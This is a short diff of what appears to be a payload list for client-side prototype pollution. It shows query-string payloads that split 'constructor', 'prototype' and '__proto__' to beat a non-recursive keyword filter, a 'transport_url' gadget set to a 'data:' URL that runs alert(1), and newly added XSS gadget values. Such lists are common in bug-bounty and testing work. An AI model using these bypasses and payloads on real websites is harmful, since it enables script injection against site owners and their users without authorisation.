@@ -15,3 +15,7 @@ App strips but not recursively:
 /?constconstructorructor.[protoprototypetype][foo]=bar
 /?constconstructorructor.protoprototypetype.foo=bar
 /?__pro__proto__to__[transport_url]=data:,alert(1);
+
+Payloads:
+:,alert(1)
+-alert(1)-
